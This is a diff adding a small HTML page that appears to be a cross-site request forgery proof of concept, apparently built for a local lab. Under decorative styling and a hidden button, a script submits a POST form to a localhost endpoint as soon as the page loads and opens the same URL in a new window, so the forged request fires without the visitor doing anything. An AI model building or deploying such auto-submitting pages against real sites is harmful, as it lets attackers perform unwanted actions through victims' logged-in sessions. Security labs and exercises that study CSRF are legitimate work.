@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <style>
+      body{
+        background: linear-gradient(to right, #c0c0aa, #1cefff); 
+      }
+      .div{
+        width: 30%;
+        height: 100px;
+        background: linear-gradient(to right, #c0c0aa, #1cefff); 
+        box-shadow: 1px 1px 20px #fff , -1px -1px 20px #fff;
+        transform: translate(100%,50%);
+        border-radius: 10px;
+      }
+      button{
+        display: none;
+      }
+    </style>
+    
+  </head>
+  <body>
+    
+    <div class="div">
+      
+    </div>
+    <form id="D1" method="POST" action="http://localhost:8158/csrf1.html">
+      
+      <button id="open" ></button>
+   
+   <script>
+     document.forms['D1'].submit();
+     window.open("http://localhost:8158/csrf1.html");
+   </script>
+   </form>
+   
+  </body>
+</html>
